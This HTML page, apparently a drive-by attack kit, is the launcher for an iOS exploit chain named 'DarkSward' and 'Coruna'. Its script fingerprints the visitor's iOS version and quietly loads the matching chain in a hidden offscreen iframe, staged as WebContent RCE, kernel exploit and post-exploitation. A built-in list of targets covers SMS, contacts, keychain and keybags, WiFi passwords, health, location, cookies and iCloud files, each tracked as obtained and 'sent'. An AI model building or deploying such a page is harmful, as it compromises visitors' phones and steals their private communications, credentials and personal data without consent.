<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>DarkSward - iOS Exploit Chain</title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
      min-height: 100vh;
      color: #e0e0e0;
      padding: 20px;
    }
    .container {
      max-width: 900px;
      margin: 0 auto;
    }
    h1 {
      text-align: center;
      color: #00ff88;
      font-size: 2rem;
      margin-bottom: 10px;
      text-shadow: 0 0 20px rgba(0,255,136,0.3);
    }
    .subtitle {
      text-align: center;
      color: #888;
      margin-bottom: 30px;
      font-size: 0.9rem;
    }
    .version-detect {
      background: rgba(255,255,255,0.05);
      border: 2px solid #333;
      border-radius: 12px;
      padding: 30px;
      text-align: center;
      margin-bottom: 30px;
    }
    .version-detect h2 {
      color: #fff;
      margin-bottom: 20px;
    }
    .version-info {
      font-size: 1.2rem;
      margin: 20px 0;
      padding: 15px;
      background: rgba(0,255,136,0.1);
      border-radius: 8px;
      border: 1px solid #00ff88;
    }
    .version-info.detected {
      color: #00ff88;
    }
    .version-info .device {
      font-size: 1rem;
      color: #888;
      margin-top: 10px;
    }
    .loading {
      color: #ffaa00;
      font-size: 1rem;
      margin: 20px 0;
    }
    .loading::after {
      content: '';
      animation: dots 1.5s steps(4, end) infinite;
    }
    @keyframes dots {
      0%, 20% { content: ''; }
      40% { content: '.'; }
      60% { content: '..'; }
      80%, 100% { content: '...'; }
    }
    .exploit-path {
      display: inline-block;
      padding: 10px 20px;
      border-radius: 8px;
      margin: 20px 0;
      font-weight: 600;
    }
    .exploit-path.coruna {
      background: rgba(100, 150, 255, 0.2);
      border: 2px solid #6496ff;
      color: #6496ff;
    }
    .exploit-path.darksward {
      background: rgba(0, 255, 136, 0.2);
      border: 2px solid #00ff88;
      color: #00ff88;
    }
    .stage-indicator {
      display: flex;
      justify-content: center;
      gap: 20px;
      margin-bottom: 30px;
      flex-wrap: wrap;
    }
    .stage {
      background: rgba(255,255,255,0.05);
      border: 2px solid #333;
      border-radius: 12px;
      padding: 15px 25px;
      text-align: center;
      min-width: 120px;
      transition: all 0.3s ease;
    }
    .stage.active {
      border-color: #00ff88;
      background: rgba(0,255,136,0.1);
      box-shadow: 0 0 20px rgba(0,255,136,0.2);
    }
    .stage.completed {
      border-color: #00ff88;
      background: rgba(0,255,136,0.2);
    }
    .stage.error {
      border-color: #ff4444;
      background: rgba(255,68,68,0.1);
    }
    .stage-label {
      font-size: 0.75rem;
      color: #888;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-bottom: 5px;
    }
    .stage-name {
      font-size: 1.1rem;
      font-weight: 600;
      color: #fff;
    }
    .stage-status {
      font-size: 0.8rem;
      margin-top: 5px;
      color: #00ff88;
    }
    .stage.error .stage-status {
      color: #ff4444;
    }
    .progress-bar-container {
      background: rgba(255,255,255,0.1);
      border-radius: 10px;
      height: 8px;
      margin-bottom: 30px;
      overflow: hidden;
    }
    .progress-bar {
      height: 100%;
      background: linear-gradient(90deg, #00ff88, #00cc6a);
      border-radius: 10px;
      transition: width 0.3s ease;
      width: 0%;
    }
    .log-container {
      background: rgba(0,0,0,0.3);
      border: 1px solid #333;
      border-radius: 12px;
      padding: 20px;
      max-height: 400px;
      overflow-y: auto;
    }
    .log-container::-webkit-scrollbar {
      width: 8px;
    }
    .log-container::-webkit-scrollbar-track {
      background: rgba(255,255,255,0.05);
      border-radius: 4px;
    }
    .log-container::-webkit-scrollbar-thumb {
      background: rgba(255,255,255,0.2);
      border-radius: 4px;
    }
    .log-entry {
      font-family: 'Monaco', 'Menlo', monospace;
      font-size: 0.85rem;
      padding: 6px 10px;
      margin-bottom: 4px;
      border-radius: 4px;
      display: flex;
      gap: 10px;
      animation: fadeIn 0.2s ease;
    }
    @keyframes fadeIn {
      from { opacity: 0; transform: translateY(-5px); }
      to { opacity: 1; transform: translateY(0); }
    }
    .log-entry .timestamp {
      color: #666;
      min-width: 70px;
    }
    .log-entry .tag {
      color: #00cc6a;
      min-width: 80px;
      font-weight: 600;
    }
    .log-entry .message {
      color: #e0e0e0;
      word-break: break-all;
    }
    .log-entry.error .tag { color: #ff4444; }
    .log-entry.error .message { color: #ff6666; }
    .log-entry.info .tag { color: #4488ff; }
    .log-entry.warn .tag { color: #ffaa00; }
    #frame {
      width: 1px;
      height: 1px;
      opacity: 0.01;
      position: absolute;
      left: -9999px;
      border: none;
    }
    .supported-versions {
      margin-top: 30px;
      padding: 20px;
      background: rgba(0,0,0,0.2);
      border-radius: 12px;
      border: 1px solid #333;
    }
    .supported-versions h3 {
      color: #fff;
      margin-bottom: 15px;
    }
    .version-table {
      width: 100%;
      border-collapse: collapse;
    }
    .version-table th, .version-table td {
      padding: 10px;
      text-align: left;
      border-bottom: 1px solid #333;
    }
    .version-table th {
      color: #888;
      font-weight: 500;
    }
    .version-table .coruna { color: #6496ff; }
    .version-table .darksward { color: #00ff88; }
    .file-list {
      margin-top: 30px;
      padding: 20px;
      background: rgba(0,0,0,0.2);
      border-radius: 12px;
      border: 1px solid #333;
      max-height: 400px;
      overflow-y: auto;
    }
    .file-list h3 {
      color: #fff;
      margin-bottom: 15px;
      position: sticky;
      top: 0;
      background: rgba(0,0,0,0.5);
      padding: 10px 0;
    }
    .file-category {
      margin-bottom: 15px;
    }
    .file-category-title {
      color: #00ff88;
      font-weight: 600;
      margin-bottom: 8px;
      padding: 5px 10px;
      background: rgba(0,255,136,0.1);
      border-radius: 6px;
      cursor: pointer;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .file-category-title:hover {
      background: rgba(0,255,136,0.2);
    }
    .file-category-title::after {
      content: '▼';
      font-size: 10px;
      transition: transform 0.2s;
    }
    .file-category-title.collapsed::after {
      transform: rotate(-90deg);
    }
    .file-category.collapsed .file-items {
      display: none;
    }
    .file-category.collapsed .file-category-title::after {
      transform: rotate(-90deg);
    }
    .file-item {
      padding: 6px 10px 6px 20px;
      font-size: 0.85rem;
      color: #aaa;
      border-bottom: 1px solid rgba(255,255,255,0.05);
    }
    .file-item:last-child {
      border-bottom: none;
    }
    .file-item .path {
      color: #6496ff;
      font-family: monospace;
      word-break: break-all;
    }
    .file-item .desc {
      color: #888;
      font-size: 0.8rem;
    }
    .file-item .status {
      display: inline-block;
      padding: 2px 6px;
      border-radius: 4px;
      font-size: 0.7rem;
      margin-left: 8px;
    }
    .file-item .status.pending {
      background: rgba(255,170,0,0.2);
      color: #ffaa00;
    }
    .file-item .status.obtained {
      background: rgba(0,255,136,0.2);
      color: #00ff88;
    }
    .file-item .status.sent {
      background: rgba(100,150,255,0.2);
      color: #6496ff;
    }
    .file-item .status.error {
      background: rgba(255,68,68,0.2);
      color: #ff4444;
    }
  </style>
</head>
<body>
  <div class="container">
    <h1>DarkSward</h1>
    <p class="subtitle">iOS Exploit Chain</p>

    <div class="version-detect" id="versionDetect">
      <h2>检测iOS版本</h2>
      <div class="loading" id="loadingText">正在检测设备信息</div>
      <div class="version-info" id="versionInfo" style="display:none">
        <div>iOS版本: <strong id="iosVersion">-</strong></div>
        <div class="device">设备: <span id="deviceModel">-</span></div>
      </div>
    </div>

    <div class="exploit-path" id="exploitPath" style="display:none"></div>

    <div id="exploitUI" style="display:none">
      <div class="stage-indicator">
        <div class="stage" id="stage1">
          <div class="stage-label">Stage 1</div>
          <div class="stage-name">WebContent RCE</div>
          <div class="stage-status">Pending</div>
        </div>
        <div class="stage" id="stage2">
          <div class="stage-label">Stage 2</div>
          <div class="stage-name">Kernel Exploit</div>
          <div class="stage-status">Pending</div>
        </div>
        <div class="stage" id="stage3">
          <div class="stage-label">Stage 3</div>
          <div class="stage-name">Post-Exploitation</div>
          <div class="stage-status">Pending</div>
        </div>
      </div>

      <div class="progress-bar-container">
        <div class="progress-bar" id="progressBar"></div>
      </div>

      <div class="log-container" id="logContainer"></div>
      
      <div class="file-list" id="fileList" style="display:none">
        <h3>📁 可获取的文件列表</h3>
        <div id="fileListContent"></div>
      </div>
    </div>
  </div>

  <iframe id="frame" style="display:none"></iframe>

  <script>
    const logContainer = document.getElementById('logContainer');
    const progressBar = document.getElementById('progressBar');
    const versionDetect = document.getElementById('versionDetect');
    const loadingText = document.getElementById('loadingText');
    const versionInfo = document.getElementById('versionInfo');
    const exploitPath = document.getElementById('exploitPath');
    const exploitUI = document.getElementById('exploitUI');
    const frame = document.getElementById('frame');

    const stages = {
      stage1: document.getElementById('stage1'),
      stage2: document.getElementById('stage2'),
      stage3: document.getElementById('stage3')
    };

    function addLog(tag, message, type = 'normal') {
      const entry = document.createElement('div');
      entry.className = 'log-entry ' + type;
      
      const timestamp = document.createElement('span');
      timestamp.className = 'timestamp';
      const ms = Date.now();
      timestamp.textContent = ms + 'ms';
      
      const tagEl = document.createElement('span');
      tagEl.className = 'tag';
      tagEl.textContent = '[' + tag + ']';
      
      const msgEl = document.createElement('span');
      msgEl.className = 'message';
      msgEl.textContent = message;
      
      entry.appendChild(timestamp);
      entry.appendChild(tagEl);
      entry.appendChild(msgEl);
      logContainer.appendChild(entry);
      logContainer.scrollTop = logContainer.scrollHeight;
    }

    function setStageProgress(stage, status, isError = false) {
      const el = stages[stage];
      const statusEl = el.querySelector('.stage-status');
      statusEl.textContent = status;
      
      el.classList.remove('active', 'completed', 'error');
      if (isError) {
        el.classList.add('error');
      } else if (status === 'Completed') {
        el.classList.add('completed');
      } else {
        el.classList.add('active');
      }
    }

    function setOverallProgress(percent) {
      progressBar.style.width = percent + '%';
    }

    function detectIOSVersion() {
      const ua = navigator.userAgent;
      // 支持两段和三段版本号 (如 iPhone OS 17_2 或 iPhone OS 17_2_0)
      let match = ua.match(/iPhone OS (\d+)[._](\d+)(?:[._](\d+))?/);
      if (!match) {
        match = ua.match(/OS (\d+)[._](\d+)(?:[._](\d+))?/);
      }
      if (!match) {
        match = ua.match(/iPad.*OS (\d+)[._](\d+)(?:[._](\d+))?/);
      }
      if (!match) {
        match = ua.match(/iPod.*OS (\d+)[._](\d+)(?:[._](\d+))?/);
      }
      if (match) {
        return {
          major: parseInt(match[1]),
          minor: parseInt(match[2]),
          patch: match[3] ? parseInt(match[3]) : 0
        };
      }
      return null;
    }

    function getDeviceModel() {
      const ua = navigator.userAgent;
      if (ua.includes('iPhone')) return 'iPhone';
      if (ua.includes('iPad')) return 'iPad';
      if (ua.includes('iPod')) return 'iPod';
      if (ua.includes('Macintosh')) return 'Mac (假装iOS)';
      return 'Unknown';
    }

    function chooseExploitPath(iosVersion) {
      if (!iosVersion) return 'unknown';
      
      if (iosVersion.major >= 17) {
        return 'darksward';
      } else if (iosVersion.major >= 13) {
        return 'coruna';
      }
      return 'unsupported';
    }

    window.addEventListener('message', function(e) {
      const data = e.data;
      if (!data || !data.type) return;

      switch (data.type) {
        case 'log':
          addLog(data.tag || 'LOG', data.message, data.logType || 'normal');
          break;
        case 'stage':
          if (data.stage === 'stage1') {
            setStageProgress('stage1', data.status, data.isError);
            setOverallProgress(data.percent || 10);
          } else if (data.stage === 'stage2') {
            setStageProgress('stage2', data.status, data.isError);
            setOverallProgress(data.percent || 50);
          } else if (data.stage === 'stage3') {
            setStageProgress('stage3', data.status, data.isError);
            setOverallProgress(data.percent || 90);
          }
          if (data.isError) {
            setOverallProgress(0);
          }
          break;
        case 'complete':
          setStageProgress('stage3', 'Completed');
          setOverallProgress(100);
          addLog('DONE', 'Exploit chain completed', 'info');
          break;
        case 'error':
          addLog('ERROR', data.message, 'error');
          setOverallProgress(0);
          break;
        case 'coruna_log':
          addLog(data.tag || 'CORUNA', data.message, data.logType || 'normal');
          break;
        case 'coruna_complete':
          setStageProgress('stage3', 'Completed');
          setOverallProgress(100);
          addLog('DONE', 'Coruna exploit chain completed', 'info');
          break;
      }
    });

    async function init() {
      addLog('INIT', 'DarkSward exploit chain initializing...', 'info');
      
      const urlParams = new URLSearchParams(window.location.search);
      let iosVersion = detectIOSVersion();
      let deviceModel = getDeviceModel();
      const ua = navigator.userAgent;
      
      if (urlParams.has('ios')) {
        const forcedIOS = urlParams.get('ios');
        const parts = forcedIOS.split('.');
        iosVersion = {
          major: parseInt(parts[0]) || 17,
          minor: parseInt(parts[1]) || 0,
          patch: parseInt(parts[2]) || 0
        };
        deviceModel = 'Manual Test';
        addLog('INIT', `强制iOS版本: ${iosVersion.major}.${iosVersion.minor}.${iosVersion.patch}`, 'warn');
      } else {
        addLog('DEBUG', `UserAgent: ${ua.substring(0, 100)}...`, 'info');
      }
      
      loadingText.style.display = 'none';
      versionInfo.style.display = 'block';
      
      if (iosVersion) {
        document.getElementById('iosVersion').textContent = 
          `${iosVersion.major}.${iosVersion.minor}.${iosVersion.patch}`;
        document.getElementById('deviceModel').textContent = deviceModel;
        
        addLog('INIT', `检测到: iOS ${iosVersion.major}.${iosVersion.minor}.${iosVersion.patch} on ${deviceModel}`, 'info');
        
        const path = chooseExploitPath(iosVersion);
        
        if (path === 'darksward') {
          exploitPath.style.display = 'block';
          exploitPath.className = 'exploit-path darksward';
          exploitPath.textContent = '使用 DarkSward Exploit (iOS 17+)';
          
          addLog('INIT', `iOS ${iosVersion.major}.${iosVersion.minor} - 使用DarkSward exploit chain`, 'info');
          
          exploitUI.style.display = 'block';
          setStageProgress('stage1', 'Starting...');
          renderFileList();
          
          sessionStorage.setItem('uid', '1');
          frame.style.display = 'block';
          frame.style.left = '-9999px';
          frame.src = 'frame.html';
          
        } else if (path === 'coruna') {
          exploitPath.style.display = 'block';
          exploitPath.className = 'exploit-path coruna';
          exploitPath.textContent = '使用 Coruna Exploit (iOS 13-16)';
          
          addLog('INIT', `iOS ${iosVersion.major}.${iosVersion.minor} - 使用Coruna exploit chain`, 'info');
          
          exploitUI.style.display = 'block';
          setStageProgress('stage1', 'Loading Coruna...');
          renderFileList();
          
          frame.style.display = 'block';
          frame.style.left = '-9999px';
          frame.src = 'coruna/';
          
        } else {
          exploitPath.style.display = 'block';
          exploitPath.className = 'exploit-path error';
          exploitPath.textContent = '不支持的iOS版本';
          
          addLog('ERROR', `iOS ${iosVersion?.major || '?'} 不支持 - 需要 iOS 13+`, 'error');
          setStageProgress('stage1', 'Unsupported', true);
        }
      } else {
        document.getElementById('iosVersion').textContent = 'Unknown';
        document.getElementById('deviceModel').textContent = 'Non-iOS Device';
        
        exploitPath.style.display = 'block';
        exploitPath.className = 'exploit-path error';
        exploitPath.textContent = '未检测到iOS设备';
        
        addLog('ERROR', '无法检测iOS版本，请使用iOS设备访问', 'error');
        setStageProgress('stage1', 'Error', true);
      }
    }

    // Forensic files list - same as file_downloader.js FORENSIC_FILES
    const FORENSIC_FILES = [
      // Communications 
      { path: "/private/var/mobile/Library/SMS/sms.db", category: "communications", description: "SMS/iMessage database" },
      { path: "/private/var/mobile/Library/CallHistoryDB/CallHistory.storedata", category: "communications", description: "Call history" },
      { path: "/private/var/mobile/Library/AddressBook/AddressBook.sqlitedb", category: "communications", description: "Contacts database" },
      
      // Credentials - WiFi
      { path: "/private/var/preferences/SystemConfiguration/com.apple.wifi.plist", category: "credentials", description: "WiFi networks config" },
      { path: "/private/var/preferences/SystemConfiguration/com.apple.wifi-networks.plist.backup", category: "credentials", description: "WiFi networks backup" },
      { path: "/private/var/preferences/com.apple.wifi.known-networks.plist", category: "credentials", description: "Known WiFi networks" },
      
      // Browser Data
      { path: "/private/var/mobile/Library/Safari/History.db", category: "browser", description: "Safari history" },
      { path: "/private/var/mobile/Library/Safari/Bookmarks.db", category: "browser", description: "Safari bookmarks" },
      { path: "/private/var/mobile/Library/Safari/BrowserState.db", category: "browser", description: "Safari browser state" },
      { path: "/private/var/mobile/Library/Cookies/Cookies.binarycookies", category: "browser", description: "Safari cookies" },
      
      // Location Data
      { path: "/private/var/mobile/Library/Caches/locationd/consolidated.db", category: "location", description: "Location history" },
      { path: "/private/var/mobile/Library/Caches/locationd/clients.plist", category: "location", description: "Location clients" },
      { path: "/private/var/root/Library/Caches/locationd/consolidated.db", category: "location", description: "Root location history" },
      
      // Personal Data
      { path: "/private/var/mobile/Library/Notes/notes.sqlite", category: "personal", description: "Notes database" },
      { path: "/private/var/mobile/Library/Calendar/Calendar.sqlitedb", category: "personal", description: "Calendar database" },
      { path: "/private/var/mobile/Media/PhotoData/Photos.sqlite", category: "personal", description: "Photos metadata" },
      { path: "/private/var/mobile/Library/Health/healthdb.sqlite", category: "personal", description: "Health database" },
      { path: "/private/var/mobile/Library/Health/healthdb_secure.sqlite", category: "personal", description: "Secure health database" },
      
      // Device Info
      { path: "/private/var/root/Library/Lockdown/data_ark.plist", category: "device", description: "Device identifiers" },
      { path: "/private/var/mobile/Library/Preferences/com.apple.identityservices.idstatuscache.plist", category: "device", description: "Identity services cache" },
      { path: "/private/var/containers/Shared/SystemGroup/systemgroup.com.apple.configurationprofiles/Library/ConfigurationProfiles/ProfileMeta.plist", category: "device", description: "Configuration profiles" },
      { path: "/private/var/preferences/SystemConfiguration/preferences.plist", category: "device", description: "System preferences" },
      { path: "/private/var/mobile/Library/FrontBoard/applicationState.db", category: "device", description: "Installed applications database" },
      
      // SIM/Cellular Info
      { path: "/private/var/wireless/Library/Preferences/com.apple.commcenter.plist", category: "sim", description: "SIM card information" },
      { path: "/private/var/wireless/Library/Preferences/com.apple.commcenter.data.plist", category: "sim", description: "Cellular data info" },
      { path: "/private/var/wireless/Library/Databases/CellularUsage.db", category: "sim", description: "Cellular usage database" },
      
      // Keychain/Keybag (copied to /tmp)
      { path: "/tmp/keychain-2.db", category: "keychain", description: "Keychain database" },
      { path: "/tmp/persona.kb", category: "keychain", description: "Persona keybag" },
      { path: "/tmp/usersession.kb", category: "keychain", description: "User session keybag" },
      { path: "/tmp/System.keybag", category: "keychain", description: "System keybag" },
      { path: "/tmp/Backup.keybag", category: "keychain", description: "Backup keybag" },
      { path: "/tmp/device.kb", category: "keychain", description: "Device keybag" },
      
      // WiFi passwords (dumped to various paths)
      { path: "/tmp/wifi_passwords.txt", category: "wifi_passwords", description: "WiFi passwords" },
      { path: "/var/wireless/wifi_passwords.txt", category: "wifi_passwords", description: "WiFi passwords" },
      { path: "/private/var/wireless/wifi_passwords.txt", category: "wifi_passwords", description: "WiFi passwords" },
      
      // iCloud Drive files
      { path: "/tmp/icloud_dump/", category: "icloud", description: "iCloud Drive files (directory)" },
    ];

    function renderFileList() {
      const container = document.getElementById('fileListContent');
      const categories = {};
      
      FORENSIC_FILES.forEach(file => {
        if (!categories[file.category]) {
          categories[file.category] = [];
        }
        categories[file.category].push(file);
      });
      
      const categoryNames = {
        'communications': '📱 通信记录 (Communications)',
        'credentials': '🔐 凭证 (Credentials)',
        'browser': '🌐 浏览器数据 (Browser)',
        'location': '📍 位置数据 (Location)',
        'personal': '👤 个人数据 (Personal)',
        'device': '📲 设备信息 (Device)',
        'sim': '📡 SIM/蜂窝数据 (SIM/Cellular)',
        'keychain': '🔑 钥匙串 (Keychain)',
        'wifi_passwords': '📶 WiFi密码 (WiFi Passwords)',
        'icloud': '☁️ iCloud文件 (iCloud Files)',
      };
      
      let html = '';
      Object.keys(categories).forEach(cat => {
        const files = categories[cat];
        html += `
          <div class="file-category collapsed" data-category="${cat}">
            <div class="file-category-title" onclick="toggleCategory('${cat}')">
              ${categoryNames[cat] || cat} <span>(${files.length})</span>
            </div>
            <div class="file-items">
              ${files.map(f => `
                <div class="file-item" data-path="${f.path}">
                  <div class="path">${f.path} <span class="status pending" id="status-${f.path.replace(/[\/\.\-]/g, '_')}">⏳ 待获取</span></div>
                  <div class="desc">${f.description}</div>
                </div>
              `).join('')}
            </div>
          </div>
        `;
      });
      
      container.innerHTML = html;
      document.getElementById('fileList').style.display = 'block';
    }
    
    function setFileStatus(path, status) {
      const safeId = 'status-' + path.replace(/[\/\.\-]/g, '_');
      const el = document.getElementById(safeId);
      if (!el) return;
      el.className = 'status ' + status;
      const statusText = {
        'pending': '⏳ 待获取',
        'obtained': '✅ 已获取',
        'sent': '📤 已发送',
        'error': '❌ 错误'
      };
      el.textContent = statusText[status] || status;
    }
    
    function setFileStatusAll(status) {
      document.querySelectorAll('.file-item').forEach(item => {
        const path = item.dataset.path;
        setFileStatus(path, status);
      });
    }
    
    function toggleCategory(cat) {
      const el = document.querySelector(`.file-category[data-category="${cat}"]`);
      el.classList.toggle('collapsed');
    }

    init();
  </script>

  <div class="supported-versions" id="supportedVersions" style="display:none">
    <h3>支持的iOS版本</h3>
    <table class="version-table">
      <thead>
        <tr>
          <th>Exploit Chain</th>
          <th>iOS版本</th>
          <th>设备</th>
        </tr>
      </thead>
      <tbody>
        <tr>
          <td class="coruna">Coruna</td>
          <td>iOS 13.x - 16.6.x</td>
          <td>iPhone 6s+</td>
        </tr>
        <tr>
          <td class="darksward">DarkSward</td>
          <td>iOS 17.x - 18.x</td>
          <td>iPhone XS - iPhone 17</td>
        </tr>
      </tbody>
    </table>
  </div>
</body>
</html>
